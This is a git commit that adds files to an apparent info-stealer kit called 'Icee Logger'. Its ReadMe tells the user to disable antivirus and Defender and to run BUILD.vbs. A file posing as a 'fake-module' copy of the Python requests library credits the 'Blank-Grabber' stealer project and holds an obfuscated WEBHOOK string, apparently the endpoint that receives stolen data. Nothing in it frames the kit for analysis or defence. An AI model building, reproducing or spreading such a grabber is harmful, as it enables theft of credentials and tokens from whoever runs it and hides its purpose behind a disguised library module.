26e89ba8b91da6133a691c07c3ae390091d5ef13
iceeburr <iceeburr@gmail.com>
2022-11-24 12:47:27 +0300

    new stuff

---
+++ Icee Logger/ReadMe.txt
@@ -0,0 +1,5 @@
+Python must be installed! (Version < 3.11)
+Internet connection must be available!
+Disable your antivirus/defender!
+
+Run "BUILD.vbs"
---
+++ Icee Logger/env/Scripts/fake-module/requests/__init__.py
@@ -0,0 +1,3 @@
+__author__ = "Blank-c"
+__github__ = "https://github.com/Blank-c/Blank-Grabber"
+WEBHOOK = "XmoUNb2=|CWNC9_Z*pWVV{dIQVQ^_LcV%K|Z*OaJFEKDQH83(WF)=VRHZw3eH8L<TFHw1TNltJ_M?qFFLT6A;XK-*;GDmWCLt%1lNp@o}ZCH11Z%!>#Hc>cbM@M-xZcB1+LRoWjLSHmyR&+6GVMbGHLI"
